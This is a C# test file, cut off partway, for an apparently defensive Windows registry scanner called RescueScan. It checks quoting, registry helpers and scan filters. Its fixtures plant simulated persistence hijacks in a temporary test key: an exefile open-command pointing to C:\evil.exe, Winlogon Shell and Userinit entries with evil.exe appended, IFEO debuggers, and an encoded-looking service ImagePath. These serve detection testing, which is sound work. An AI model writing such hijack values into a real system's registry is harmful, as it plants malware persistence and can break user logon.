// Self-contained tests for RescueScan's registry / process helpers and scan-side filters (C# 5, no frameworks).
// Compiled TOGETHER with RescueScan.cs using -main:RescueScan.Tests.TestMain:
//   Linux/Mono : tests/run-tests.sh          Windows : tests/run-tests.ps1 (in-box csc)
// Registry tests use a throwaway key HKCU\Software\RescueScanTests\<guid> that is always removed at the end (the one
// Windows-only mount test also uses a temporary hive file and an HKLM\RS_U9<random> mount point, both removed).
// Tests named "[win]" need real Windows (P/Invoke, reg.exe, registry symbolic links) and are skipped elsewhere.
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using Microsoft.Win32;

namespace RescueScan.Tests
{
    static class TestMain
    {
        static int passed, failed, skipped;
        static readonly bool OnWindows = Environment.OSVersion.Platform == PlatformID.Win32NT;
        static readonly string Id = Guid.NewGuid().ToString("N");
        static readonly string Sub = "Software\\RescueScanTests\\" + Id;   // relative to HKCU
        static readonly string Root = "HKCU\\" + Sub;

        static int Main()
        {
            try
            {
                Run("QuoteArg: fixed cases", QuoteArgCases);
                Run("QuoteArg: round trip through an MSVCRT argv parser (fuzz)", QuoteArgFuzz);
                Run("FormatData: reg.exe text format", FormatDataCases);
                Run("SplitRoot: root spellings", SplitRootCases);
                Run("Values: exact names, default value, data format", ValuesExact);
                Run("Values: all root spellings", ValuesRootSpellings);
                Run("Values/Subkeys/Pairs: missing key / bad root => empty", MissingKeys);
                Run("Subkeys: full paths with the caller's root spelling", SubkeysPaths);
                Run("Pairs: descendants only, nested, data", PairsNested);
                Run("Pairs: depth bound", PairsDepth);
                Run("Pairs: fair share - a padded sibling cannot hide later keys; truncation reported", PairsFairShare);
                Run("Scan filter: AddValues keeps (x)/REG_x/trail /q\"uote, skips default", ScanFilterAddValues);
                Run("Scan filter: AddValuesRisk keeps (x)/REG_x", ScanFilterAddValuesRisk);
                Run("Scan filter: class hijack looks only at the default value", ScanFilterClassHijack);
                Run("Winlogon Shell/Userinit are reset-only (never deleted)", ResetOnlyWinlogon);
                Run("Scan: file walk never throws, no symlink/junction loops", FilesWalk);
                Run("SetString/SetDword: create key, exact names, kinds", SetHelpers);
                Run("DeleteValue: exact names, missing => false", DeleteValueExact);
                Run("DeleteKey: whole tree, refusals, missing => false", DeleteKeyTree);
                Run("KeyExists", KeyExistsCases);
                Run("NUL in names/paths: never aliased, never acted on", NulNames);
                Run("Values: a value deleted during the read is not a hidden name", ValuesRace);
                Run("Live mode: ProfileImagePath -> folders on the TARGET volume only", ProfileDirs);
                Run("Detect: WinPE hidden only on X: with MiniNT; live OS labelled", TargetList);
                Run("WOW64: System32 of the running OS via Sysnative", FsPaths);
                Run("Defaults: Userinit / Shell / VMApplet / AlternateShell / SystemRoot", DefaultsWinlogon);
                Run("Defaults: BootExecute autochk lines, repair, SetupExecute servicing", DefaultsBootExecute);
                Run("Defaults: known IFEO debuggers", DefaultsIfeo);
                Run("Scan: reset-only rows (BootExecute/SetupExecute/VMApplet/Userinit), IFEO value rows", ScanResetKinds);
                Run("Repair anchors: good / bad", AnchorsGood);
                Run(".reg writer/parser: all types, escaping, round trip", RegFileRoundTrip);
                Run("Snapshot -> .reg -> SetRaw: exact restore", SnapshotRestore);
                Run("Quarantine manifest: escaping, validation, names, folder", ManifestCases);
                Run("Quarantine: logical location -> hive of a later session", LocateResolve);
                Run("Explorer: protected paths", ProtectedPaths);
                Run("Accounts: profile folder validation", ProfilePaths);
                Run("Pre-boot: bcdedit entries (description after path)", BcdParse);
                Run("FsOps: read-only delete, move, tree", FsOpsCases);
                Run("Unlock: restriction list", RestrictionList);
                Run("Live mode: SamePath / WinTarget labels", LiveHelpers);
                Run("Mounts: RS_* names", MountNames);
                Run("Mounts: mount / missing file / file in use / unload all", MountBasic);
                Run("Mounts: every stale RS_* cleaned up, held ones reported and skipped", MountStale);
                Run("Mounts: old mount at the same name replaced, or the mount fails", MountSameName);
                Run("Mounts: another instance's hives are never touched", MountOtherInstance);
                Run("Mounts: user mount names used up -> counted as not mounted", MountUserCap);
                Run("Mounts: reg.exe blocked by DisableRegistryTools -> reason + hint once", MountBlocked);
                Run("RunProcess: big stderr does not deadlock", ProcBigStderr);
                Run("RunProcess: exit code + stderr on failure", ProcFailure);
                Run("RunProcess: timeout kills the child", ProcTimeout);
                Run("RunProcess: timeout message without arguments (passwords)", ProcTimeoutNoArgs);
                Run("OneLine: tool output for a status line", OneLineCases);
                Run("ToolHijack: IFEO Debugger / filter / VerifierDlls / SilentProcessExit", ToolHijackCases);
                Run("RegToolsBlocked: DisableRegistryTools DWORD", RegToolsBlockedCases);
                Run("RunProcess: stdin is closed (no wait for input)", ProcStdinClosed);
                Run("RunProcess: output is capped but drained", ProcOutputCap);
                Run("Risk(): clean Windows defaults never SUSPECT; evasions and LOLBins caught", RiskCases);
                Run("Tasks: XML actions only (entities, prefixes, comments, COM)", TaskXmlCases);
                Run("Tasks: TaskCache Actions blob parser + printable fallback", TaskCacheBlobCases);
                Run("Tasks: XML + TaskCache join, registry-only/hidden tasks, cleanup keys", ScanTasksCases);
                Run("Control set: Select\\Default, fallbacks, warnings", ControlSetCases);
                Run("Session Manager extras + AppCertDlls key; Policies Run once", SessionMgrExtraCases);
                Run("Services/ServiceDll listing + Active Setup built-ins", ServiceAndActiveSetupCases);
                Run("User hive: per-user shell, cmd AutoRun, logon script, screensaver", UserHiveCases);
                Run("RunOnceEx/AeDebug/UserList/Defender exclusions/Setup/DataBasePath/VerifierDlls", MachineExtrasCases);
                Run("hosts: default clean, AV blocks / pharming SUSPECT, lists capped", HostsCases);
                Run("Startup: .lnk targets, dropped programs, checker content; payload path", StartupAndPayloadCases);
                Run("Process tree: PROCESSENTRY32W size and layout (x86 + x64)", ProcEntryLayout);
                Run("Process tree: root first, visited set, stale/reused parents, never-kill set", ProcTreeGrow);
                Run("Process tree: critical processes", ProcCritical);
                Run("Watchdog: event names, command lines, back-off, relaunch cap", WatchdogArgsCases);
                Run("Launch: exe direct, batch via cmd, everything else as text", LaunchModes);
                Run("Process tree: real Toolhelp snapshot sees this process [win]", ProcSnapshotWin);
                Run("SysExe: absolute System32 path [win]", SysExeWin);
                Run("Values: raw types .NET cannot read (REG_RESOURCE_LIST, custom) [win]", RawTypesWin);
                Run("Pairs/DeleteKey: registry symbolic links are not followed [win]", LinksWin);
                Run("Export: exit code AND file [win]", ExportWin);
                Run("Values/Pairs: a key with a deny-ACL is noted, not silently skipped [win]", DeniedWin);
                Run("QuoteArg: round trip through the real CommandLineToArgvW [win]", QuoteArgWin);
                Run("Mounts: real reg.exe save / load / read / unload [win, admin]", MountWin);
                Run("Snapshot/SetRaw: odd REG_SZ and non-.NET types byte for byte [win]", RawRoundTripWin);
            }
            finally
            {
                Cleanup();
            }
            Console.WriteLine();
            Console.WriteLine("passed: " + passed + "   failed: " + failed + "   skipped: " + skipped);
            return failed == 0 ? 0 : 1;
        }

        // ------------------------------------------------------------------ runner
        class SkipException : Exception { public SkipException(string m) : base(m) { } }

        static void Run(string name, Action t)
        {
            try { t(); passed++; Console.WriteLine("PASS  " + name); }
            catch (SkipException e) { skipped++; Console.WriteLine("SKIP  " + name + "  (" + e.Message + ")"); }
            catch (Exception e) { failed++; Console.WriteLine("FAIL  " + name + "\n      " + e.Message.Replace("\n", "\n      ")); if (e is NullReferenceException) Console.WriteLine(e.StackTrace); }
        }

        static void WindowsOnly() { if (!OnWindows) throw new SkipException("needs Windows"); }

        static string Show(object o)
        {
            if (o == null) return "<null>";
            return o.ToString().Replace("\0", "<NUL>").Replace("\r", "<CR>").Replace("\n", "<LF>");
        }

        static void Eq(object expected, object actual, string what)
        {
            if (!object.Equals(expected, actual))
                throw new Exception(what + ": expected [" + Show(expected) + "] got [" + Show(actual) + "]");
        }

        static void True(bool cond, string what) { if (!cond) throw new Exception(what); }

        // ------------------------------------------------------------------ fixtures
        static RegistryKey HKCU() { return RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, Reg.View); }

        // Creates (or opens) HKCU\<Sub>\<rel> with the managed API directly (not through the code under test).
        static RegistryKey Make(string rel)
        {
            using (RegistryKey b = HKCU()) return b.CreateSubKey(rel.Length == 0 ? Sub : Sub + "\\" + rel);
        }

        static bool ManagedExists(string relToHkcu)
        {
            using (RegistryKey b = HKCU())
            using (RegistryKey k = b.OpenSubKey(relToHkcu)) return k != null;
        }

        static void Cleanup()
        {
            try { if (Reg.KeyExists(Root)) Reg.DeleteKey(Root); } catch { }   // link-safe on Windows
            foreach (string f in tempFiles) try { File.Delete(f); } catch { }
            foreach (string d in tempDirs) try { DeleteDir(d); } catch { }
            using (RegistryKey b = HKCU())
            {
                try { b.DeleteSubKeyTree(Sub, false); } catch { }
                try
                {
                    using (RegistryKey p = b.OpenSubKey("Software\\RescueScanTests"))
                        if (p != null && p.SubKeyCount == 0 && p.ValueCount == 0) { p.Close(); b.DeleteSubKey("Software\\RescueScanTests", false); }
                }
                catch { }
            }
            if (ManagedExists(Sub)) Console.WriteLine("WARNING: test key was not removed: " + Root);
        }

        static string[] Find(List<string[]> rows, string name)
        {
            foreach (string[] r in rows) if (r[0] == name) return r;
            return null;
        }

        // ------------------------------------------------------------------ QuoteArg
        // Reference parser for the arguments part of a command line (MSVCRT 2008+ / CommandLineToArgvW rules).
        static List<string> ParseArgs(string cmd)
        {
            List<string> res = new List<string>();
            int i = 0, n = cmd.Length;
            while (true)
            {
                while (i < n && (cmd[i] == ' ' || cmd[i] == '\t')) i++;
                if (i >= n) break;
                StringBuilder sb = new StringBuilder();
                bool inq = false;
                while (i < n)
                {
                    char c = cmd[i];
                    if (!inq && (c == ' ' || c == '\t')) break;
                    if (c == '\\')
                    {
                        int bs = 0;
                        while (i < n && cmd[i] == '\\') { bs++; i++; }
                        if (i < n && cmd[i] == '"')
                        {
                            sb.Append('\\', bs / 2);
                            if (bs % 2 == 1) { sb.Append('"'); i++; }
                        }
                        else sb.Append('\\', bs);
                        continue;
                    }
                    if (c == '"')
                    {
                        if (inq && i + 1 < n && cmd[i + 1] == '"') { sb.Append('"'); i += 2; continue; }
                        inq = !inq; i++;
                        continue;
                    }
                    sb.Append(c); i++;
                }
                res.Add(sb.ToString());
            }
            return res;
        }

        static void QuoteArgCases()
        {
            Eq("\"\"", Reg.QuoteArg(""), "empty");
            Eq("\"\"", Reg.QuoteArg(null), "null");
            Eq("\"plain\"", Reg.QuoteArg("plain"), "plain");
            Eq("\"a b\"", Reg.QuoteArg("a b"), "space");
            Eq("\"a\\\"b\"", Reg.QuoteArg("a\"b"), "embedded quote");
            Eq("\"C:\\dir\\\\\"", Reg.QuoteArg("C:\\dir\\"), "trailing backslash");
            Eq("\"C:\\a\\b\"", Reg.QuoteArg("C:\\a\\b"), "inner backslashes untouched");
            Eq("\"a\\\\\\\"b\"", Reg.QuoteArg("a\\\"b"), "backslash before quote");
            Eq("\"x\\\\\\\\\"", Reg.QuoteArg("x\\\\"), "two trailing backslashes");
            string[] tricky = { "", " ", "\"", "\\", "\\\\", "\"\"", "a\\", "\\\"", "HKLM\\RS_SOFT\\x\\", "q\"uote", "trail ", "Кириллица\\",
                                "\"%1\" %*", "C:\\Program Files\\x.exe", "a\tb", "%TEMP%\\x\\\"" };
            foreach (string t in tricky)
            {
                List<string> got = ParseArgs("export " + Reg.QuoteArg(t) + " " + Reg.QuoteArg("f.reg") + " /y");
                Eq(4, got.Count, "argc for [" + t + "]");
                Eq(t, got[1], "round trip");
                Eq("f.reg", got[2], "next argument intact after [" + t + "]");
            }
        }

        static void QuoteArgFuzz()
        {
            Random r = new Random(12345);
            char[] alphabet = { 'a', 'Z', ' ', '\t', '\\', '\\', '"', '"', 'Я', '%', '/', ':' };
            for (int i = 0; i < 5000; i++)
            {
                string a = RandomString(r, alphabet), b = RandomString(r, alphabet);
                List<string> got = ParseArgs(Reg.QuoteArg(a) + " " + Reg.QuoteArg(b));
                if (got.Count != 2 || got[0] != a || got[1] != b)
                    throw new Exception("round trip failed for [" + Show(a) + "] [" + Show(b) + "]");
            }
        }

        static string RandomString(Random r, char[] alphabet)
        {
            int len = r.Next(0, 12);
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < len; i++) sb.Append(alphabet[r.Next(alphabet.Length)]);
            return sb.ToString();
        }

        // ------------------------------------------------------------------ formatting / paths
        static void FormatDataCases()
        {
            Eq("", Reg.FormatData(null), "null");
            Eq("C:\\x.exe", Reg.FormatData("C:\\x.exe"), "REG_SZ raw");
            Eq("%TEMP%\\x.exe", Reg.FormatData("%TEMP%\\x.exe"), "REG_EXPAND_SZ not expanded");
            Eq("explorer.exe", Reg.FormatData("explorer.exe\0junk"), "string cut at first NUL like reg.exe");
            Eq("a\\0b", Reg.FormatData(new string[] { "a", "b" }), "REG_MULTI_SZ joined with backslash-zero");
            Eq("autocheck autochk *", Reg.FormatData(new string[] { "autocheck autochk *" }), "single item multi-sz");
            Eq("", Reg.FormatData(new string[0]), "empty multi-sz");
            Eq("a\\0b", Reg.FormatData(new string[] { "", "a", "", "b", "" }), "empty multi-sz items collapsed like reg.exe");
            Eq("0x7", Reg.FormatData(7), "dword");
            Eq("0x0", Reg.FormatData(0), "dword zero");
            Eq("0xffffffff", Reg.FormatData(-1), "dword -1 lowercase unsigned");
            Eq("0x123456789a", Reg.FormatData(0x123456789AL), "qword");
            Eq("0xffffffffffffffff", Reg.FormatData(-1L), "qword -1");
            Eq("01AB00FF", Reg.FormatData(new byte[] { 0x01, 0xAB, 0x00, 0xFF }), "binary uppercase hex");
            Eq("", Reg.FormatData(new byte[0]), "empty binary");
        }

        static void SplitRootCases()
        {
            string[][] cases = {
                new string[] { "HKLM\\RS_SOFT\\x", "LocalMachine", "RS_SOFT\\x" },
                new string[] { "HKEY_LOCAL_MACHINE\\SOFTWARE", "LocalMachine", "SOFTWARE" },
                new string[] { "hkcu\\Software", "CurrentUser", "Software" },
                new string[] { "HKEY_CURRENT_USER", "CurrentUser", "" },
                new string[] { "HKU\\S-1-5-21-1\\Software", "Users", "S-1-5-21-1\\Software" },
                new string[] { "HKEY_USERS\\.DEFAULT", "Users", ".DEFAULT" },
                new string[] { "HKCR\\exefile", "ClassesRoot", "exefile" },
                new string[] { "HKEY_CLASSES_ROOT\\.exe", "ClassesRoot", ".exe" },
            };
            foreach (string[] c in cases)
            {
                RegistryHive h; string sub;
                True(Reg.SplitRoot(c[0], out h, out sub), "root accepted: " + c[0]);
                Eq(c[1], h.ToString(), "hive of " + c[0]);
                Eq(c[2], sub, "subpath of " + c[0]);
            }
            RegistryHive h2; string s2;
            True(!Reg.SplitRoot("HKXX\\a", out h2, out s2), "unknown root rejected");
            True(!Reg.SplitRoot("\\Microsoft\\Windows", out h2, out s2), "empty root rejected (unmounted target)");
            True(!Reg.SplitRoot(null, out h2, out s2), "null rejected");
        }

        // ------------------------------------------------------------------ registry reads
        static readonly string Cyr = "Кириллица";

        static void FillValues(string rel)
        {
            using (RegistryKey k = Make(rel))
            {
                k.SetValue("REG_x", "C:\\a.exe");
                k.SetValue("(x)", "C:\\b.exe");
                k.SetValue("trail ", "with space");
                k.SetValue("trail", "no space");
                k.SetValue("q\"uote", "C:\\q.exe");
                k.SetValue(Cyr, "C:\\Пользователи\\x.exe");
                k.SetValue("", "defaultval");
                k.SetValue("multi", new string[] { "a", "b" }, RegistryValueKind.MultiString);
                k.SetValue("dw", 7, RegistryValueKind.DWord);
                k.SetValue("dwneg", -1, RegistryValueKind.DWord);
                k.SetValue("qw", 0x123456789AL, RegistryValueKind.QWord);
                k.SetValue("exp", "%TEMP%\\x.exe", RegistryValueKind.ExpandString);
                k.SetValue("bin", new byte[] { 0x01, 0xAB }, RegistryValueKind.Binary);
            }
        }

        static void ValuesExact()
        {
            FillValues("vals");
            List<string[]> v = Reg.Values(Root + "\\vals");
            Eq(13, v.Count, "value count");
            string[][] expect = {
                new string[] { "REG_x", "C:\\a.exe", "REG_SZ" },
                new string[] { "(x)", "C:\\b.exe", "REG_SZ" },
                new string[] { "trail ", "with space", "REG_SZ" },
                new string[] { "trail", "no space", "REG_SZ" },
                new string[] { "q\"uote", "C:\\q.exe", "REG_SZ" },
                new string[] { Cyr, "C:\\Пользователи\\x.exe", "REG_SZ" },
                new string[] { "", "defaultval", "REG_SZ" },
                new string[] { "multi", "a\\0b", "REG_MULTI_SZ" },
                new string[] { "dw", "0x7", "REG_DWORD" },
                new string[] { "dwneg", "0xffffffff", "REG_DWORD" },
                new string[] { "qw", "0x123456789a", "REG_QWORD" },
                new string[] { "exp", "%TEMP%\\x.exe", "REG_EXPAND_SZ" },
                new string[] { "bin", "01AB", "REG_BINARY" },
            };
            foreach (string[] e in expect)
            {
                string[] got = Find(v, e[0]);
                True(got != null, "value [" + e[0] + "] listed with its exact name");
                Eq(e[1], got[1], "data of [" + e[0] + "]");
                Eq(e[2], got[2], "type of [" + e[0] + "]");
            }
        }

        static void ValuesRootSpellings()
        {
            using (RegistryKey k = Make("spell")) k.SetValue("v", "1");
            foreach (string r in new string[] { "HKCU\\", "HKEY_CURRENT_USER\\", "hkcu\\" })
            {
                List<string[]> v = Reg.Values(r + Sub + "\\spell");
                Eq(1, v.Count, "values via " + r);
                Eq("1", v[0][1], "data via " + r);
            }
        }

        static void MissingKeys()
        {
            Eq(0, Reg.Values(Root + "\\nope\\deeper").Count, "Values missing");
            Eq(0, Reg.Subkeys(Root + "\\nope").Count, "Subkeys missing");
            Eq(0, Reg.Pairs(Root + "\\nope", "Debugger").Count, "Pairs missing");
            Eq(0, Reg.Values("XYZ\\Software").Count, "bad root");
            Eq(0, Reg.Values("\\Microsoft\\Windows\\CurrentVersion\\Run").Count, "empty root (unmounted target)");
            Eq(0, Reg.Values("").Count, "empty path");
            True(!Reg.KeyExists(Root + "\\nope"), "KeyExists missing");
            True(!Reg.KeyExists("\\Microsoft"), "KeyExists empty root");
        }

        static void SubkeysPaths()
        {
            Make("subs\\Sub1").Close();
            Make("subs\\Sub 2").Close();
            Make("subs\\" + Cyr).Close();
            Make("subs\\Sub1\\Nested").Close();
            List<string> s = Reg.Subkeys(Root + "\\subs");
            Eq(3, s.Count, "immediate subkeys only");
            foreach (string want in new string[] { "Sub1", "Sub 2", Cyr })
            {
                bool found = false;
                // Mono's registry emulation lower-cases key names; Windows keeps them. Compare case-insensitively.
                foreach (string p in s) if (string.Equals(p, Root + "\\subs\\" + want, StringComparison.OrdinalIgnoreCase)) found = true;
                True(found, "full path for [" + want + "] in " + string.Join(" | ", s.ToArray()));
            }
            List<string> s2 = Reg.Subkeys("HKEY_CURRENT_USER\\" + Sub + "\\subs\\");
            Eq(3, s2.Count, "with HKEY_CURRENT_USER and trailing backslash");
            foreach (string p in s2) True(p.StartsWith("HKEY_CURRENT_USER\\" + Sub + "\\subs\\", StringComparison.OrdinalIgnoreCase) && !p.Contains("\\\\"), "root spelling kept: " + p);
        }

        static void PairsNested()
        {
            using (RegistryKey k = Make("ifeo")) k.SetValue("Debugger", "ROOT-ITSELF");   // must NOT be reported
            using (RegistryKey k = Make("ifeo\\a.exe")) k.SetValue("Debugger", "C:\\evil.exe");
            using (RegistryKey k = Make("ifeo\\b.exe")) k.SetValue("GlobalFlag", 512, RegistryValueKind.DWord);
            using (RegistryKey k = Make("ifeo\\b.exe\\deep\\deeper")) k.SetValue("Debugger", new string[] { "x", "y" }, RegistryValueKind.MultiString);
            using (RegistryKey k = Make("ifeo\\c.exe")) k.SetValue("Debugger", 5, RegistryValueKind.DWord);
            bool cut;
            List<string[]> p = Reg.Pairs(Root + "\\ifeo", "Debugger", out cut);
            Eq(3, p.Count, "descendants with the value (the start key itself is excluded)");
            True(!cut, "small tree: not truncated");
            Dictionary<string, string> m = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
            foreach (string[] x in p) m[x[0]] = x[1];
            Eq("C:\\evil.exe", m.ContainsKey(Root + "\\ifeo\\a.exe") ? m[Root + "\\ifeo\\a.exe"] : null, "a.exe");
            Eq("x\\0y", m.ContainsKey(Root + "\\ifeo\\b.exe\\deep\\deeper") ? m[Root + "\\ifeo\\b.exe\\deep\\deeper"] : null, "nested multi-sz");
            Eq("0x5", m.ContainsKey(Root + "\\ifeo\\c.exe") ? m[Root + "\\ifeo\\c.exe"] : null, "dword");
        }

        static void PairsDepth()
        {
            RegistryKey cur = Make("depth");   // built level by level: one CreateSubKey path may not exceed 255 chars
            for (int i = 1; i <= Reg.PairsMaxDepth + 1; i++)
            {
                RegistryKey next = cur.CreateSubKey("d" + i);
                cur.Close();
                cur = next;
                if (i == Reg.PairsMaxDepth || i == Reg.PairsMaxDepth + 1) cur.SetValue("ImagePath", "level" + i);
            }
            cur.Close();
            bool cut;
            List<string[]> p = Reg.Pairs(Root + "\\depth", "ImagePath", out cut);
            Eq(1, p.Count, "only keys within PairsMaxDepth levels");
            Eq("level" + Reg.PairsMaxDepth, p[0][1], "deepest allowed level found");
            True(cut, "the depth bound is reported as truncation");
        }

        // A sibling with more descendants than the whole budget, sorted (or enumerated) first, must not hide the keys
        // after it: every child's own value is read first, and each subtree gets only a fair share of the budget.
        static void PairsFairShare()
        {
            int oldMax = Reg.PairsMaxKeys, oldShare = Reg.PairsMinShare;
            try
            {
                Reg.PairsMaxKeys = 100; Reg.PairsMinShare = 10;   // the app uses 250000 / 50000
                using (RegistryKey b = HKCU())
                    for (int j = 0; j < 3; j++)
                        using (RegistryKey s = b.CreateSubKey(Sub + "\\fair\\Services\\aa" + j))
                            for (int i = 0; i < 60; i++) s.CreateSubKey("k" + i).Close();
                using (RegistryKey k = Make("fair\\Services\\evilsvc")) k.SetValue("ImagePath", "C:\\Windows\\Temp\\x.exe -enc AAAA");
                using (RegistryKey k = Make("fair\\Services\\zz\\Parameters")) k.SetValue("ServiceDll", "C:\\Windows\\Temp\\y.dll");
                bool cut;
                List<string[]> p = Reg.Pairs(Root + "\\fair\\Services", "ImagePath", out cut);
                Eq(1, p.Count, "depth-1 value next to 180 padding keys found (budget 100)");
                True(p[0][0].EndsWith("\\evilsvc", StringComparison.OrdinalIgnoreCase), "evilsvc: " + p[0][0]);
                True(cut, "budget exhausted -> truncation reported");
                p = Reg.Pairs(Root + "\\fair\\Services", "ServiceDll", out cut);
                Eq(1, p.Count, "depth-2 value of the last service still found (fair share)");
                True(cut, "truncation reported");
                Reg.PairsMaxKeys = oldMax; Reg.PairsMinShare = oldShare;
                p = Reg.Pairs(Root + "\\fair\\Services", "ServiceDll", out cut);
                Eq(1, p.Count, "real bounds: found");
                True(!cut, "real bounds: 186 keys are not truncated");
            }
            finally { Reg.PairsMaxKeys = oldMax; Reg.PairsMinShare = oldShare; }
        }

        // ------------------------------------------------------------------ scan-side filters
        static Finding FindName(List<Finding> f, string name)
        {
            foreach (Finding x in f) if (x.Name == name) return x;
            return null;
        }

        static void ScanFilterAddValues()
        {
            FillValues("run");
            List<Finding> f = new List<Finding>();
            MainForm.AddValues(f, "Run (HKLM)", Root + "\\run");
            Eq(12, f.Count, "all named values become findings, the default value does not");
            foreach (string n in new string[] { "(x)", "REG_x", "trail ", "trail", "q\"uote", Cyr })
            {
                Finding x = FindName(f, n);
                True(x != null, "finding for [" + n + "]");
                Eq(n, x.DelName, "DelName exact for [" + n + "]");
                Eq(Root + "\\run", x.DelKey, "DelKey for [" + n + "]");
                Eq(0, x.Kind, "Kind for [" + n + "]");
            }
            True(FindName(f, "") == null, "default value skipped");
            Eq("C:\\b.exe", FindName(f, "(x)").Value, "data of (x)");
        }

        static void ScanFilterAddValuesRisk()
        {
            using (RegistryKey k = Make("pol"))
            {
                k.SetValue("(x)", "C:\\b.exe");
                k.SetValue("REG_x", "C:\\a.exe");
                k.SetValue("", "ignored default");
            }
            List<Finding> f = new List<Finding>();
            MainForm.AddValuesRisk(f, "Policies Explorer Run", Root + "\\pol", "SUSPECT");
            Eq(2, f.Count, "(x) and REG_x, not the default");
            Eq("SUSPECT", FindName(f, "(x)").Risk, "forced risk");
            Eq("SUSPECT", FindName(f, "REG_x").Risk, "forced risk");
        }

        static void ScanFilterClassHijack()
        {
            using (RegistryKey k = Make("soft\\Classes\\exefile\\shell\\open\\command"))
            {
                k.SetValue("", "C:\\evil.exe \"%1\" %*");
                k.SetValue("(x)", "C:\\not-the-default.exe");
            }
            using (RegistryKey k = Make("soft\\Classes\\batfile\\shell\\open\\command")) k.SetValue("", "\"%1\" %*");
            using (RegistryKey k = Make("soft\\Classes\\cmdfile\\shell\\open\\command")) k.SetValue("(Default)", "C:\\evil2.exe");
            List<Finding> f = new List<Finding>();
            MainForm.ScanExtraSoftware(f, Root + "\\soft");
            int hijacks = 0;
            foreach (Finding x in f) if (x.Category.StartsWith("Class hijack")) hijacks++;
            Eq(1, hijacks, "only exefile's real default value is a hijack");
            Finding h = null;
            foreach (Finding x in f) if (x.Category == "Class hijack [exefile]") h = x;
            True(h != null, "exefile hijack reported");
            Eq("C:\\evil.exe \"%1\" %*", h.Value, "hijack data");
        }

        // Winlogon Shell / Userinit found by the scan are reset-only: Delete, Quarantine and Easy never delete them (a
        // deleted Userinit = logon/logoff loop). Other Winlogon values stay deletable.
        static void ResetOnlyWinlogon()
        {
            using (RegistryKey k = Make("wl\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"))
            {
                k.SetValue("Shell", "explorer.exe, C:\\evil.exe");
                k.SetValue("Userinit", "C:\\Windows\\system32\\userinit.exe,C:\\x\\evil.exe,");
                k.SetValue("Taskman", "C:\\evil2.exe");
            }
            List<Finding> f = new List<Finding>();
            MainForm.ScanWinlogon(f, Root + "\\wl");
            Eq(3, f.Count, "three Winlogon findings");
            True(MainForm.ResetOnly(FindName(f, "Shell")), "Shell: reset only");
            True(MainForm.ResetOnly(FindName(f, "Userinit")), "Userinit: reset only");
            Eq("SUSPECT", FindName(f, "Userinit").Risk, "the evil Userinit is still flagged");
            True(!MainForm.ResetOnly(FindName(f, "Taskman")), "Taskman can be deleted");
            Eq(4, FindName(f, "Userinit").Kind, "Userinit: Kind 4 (reset)");
            Eq("C:\\Windows\\system32\\userinit.exe,", FindName(f, "Userinit").ResetData, "reset data");
            Eq("explorer.exe", FindName(f, "Shell").ResetData, "Shell reset data");
            Finding vm = new Finding(); vm.Category = "Winlogon GinaDLL"; vm.Kind = 0;
            True(!MainForm.ResetOnly(vm), "other Winlogon values: deletable");
            True(!MainForm.ResetOnly(null), "null");
        }

        // ------------------------------------------------------------------ registry writes
        static void SetHelpers()
        {
            string k = Root + "\\set\\new\\deep";   // missing: SetString creates it like "reg add"
            True(!Reg.KeyExists(k), "precondition: key missing");
            True(Reg.SetString(k, "Shell", "explorer.exe"), "SetString");
            True(Reg.KeyExists(k), "key created");
            True(Reg.SetString(k, "", "def"), "SetString default value");
            True(Reg.SetString(k, "exp", "%SystemRoot%\\x.exe", true), "SetString REG_EXPAND_SZ");
            True(Reg.SetString(k, "q\"uote \\", "\"%1\" %*"), "SetString odd name and data");
            True(Reg.SetString(k, "data\\", "C:\\dir\\"), "trailing backslashes");
            True(Reg.SetDword(k, "Start", 4), "SetDword");
            True(Reg.SetDword(k, "neg", -1), "SetDword -1");
            using (RegistryKey b = HKCU())
            using (RegistryKey r = b.OpenSubKey(Sub + "\\set\\new\\deep"))
            {
                Eq("explorer.exe", r.GetValue("Shell"), "REG_SZ data");
                Eq(RegistryValueKind.String, r.GetValueKind("Shell"), "REG_SZ kind");
                Eq("def", r.GetValue(""), "default value");
                Eq(RegistryValueKind.ExpandString, r.GetValueKind("exp"), "REG_EXPAND_SZ kind");
                Eq("%SystemRoot%\\x.exe", r.GetValue("exp", null, RegistryValueOptions.DoNotExpandEnvironmentNames), "expand data raw");
                Eq("\"%1\" %*", r.GetValue("q\"uote \\"), "odd name/data exact");
                Eq("C:\\dir\\", r.GetValue("data\\"), "trailing backslash data");
                Eq(RegistryValueKind.DWord, r.GetValueKind("Start"), "DWORD kind");
                Eq(4, r.GetValue("Start"), "DWORD data");
                Eq(-1, r.GetValue("neg"), "DWORD -1");
            }
            Eq("0x4", Find(Reg.Values(k), "Start")[1], "read back via Values");
            True(Reg.SetString(k, "Start", "now a string"), "overwrite changes the type like reg add /f");
            Eq("REG_SZ", Find(Reg.Values(k), "Start")[2], "type after overwrite");
            True(!Reg.SetString("XYZ\\a", "v", "d"), "bad root");
            True(!Reg.SetString("HKCU", "v", "d"), "hive root refused");
            True(!Reg.SetString(k, null, "d"), "null name");
            True(!Reg.SetString(k, "v", null), "null data");
            True(!Reg.SetString("\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "Shell", "x"), "empty root (unmounted target) refused");
        }

        static void DeleteValueExact()
        {
            FillValues("del");
            string k = Root + "\\del";
            foreach (string n in new string[] { "trail ", "(x)", "q\"uote", "REG_x", Cyr, "" })
                True(Reg.DeleteValue(k, n), "delete [" + n + "]");
            True(!Reg.DeleteValue(k, "trail "), "second delete reports false");
            True(!Reg.DeleteValue(k, "nope"), "missing value -> false");
            True(!Reg.DeleteValue(Root + "\\nope", "x"), "missing key -> false");
            True(!Reg.DeleteValue(k, null), "null name -> false");
            List<string[]> left = Reg.Values(k);
            True(Find(left, "trail") != null, "'trail' (no space) untouched");
            Eq(7, left.Count, "remaining values");
        }

        static void DeleteKeyTree()
        {
            Make("tree\\a\\b\\c").Close();
            using (RegistryKey k = Make("tree\\a")) k.SetValue("v", "1");
            Make("tree\\x y").Close();
            Make("keep").Close();
            True(Reg.DeleteKey(Root + "\\tree"), "delete whole tree");
            True(!Reg.KeyExists(Root + "\\tree"), "tree gone");
            True(Reg.KeyExists(Root + "\\keep"), "sibling kept");
            True(!Reg.DeleteKey(Root + "\\tree"), "missing key -> false");
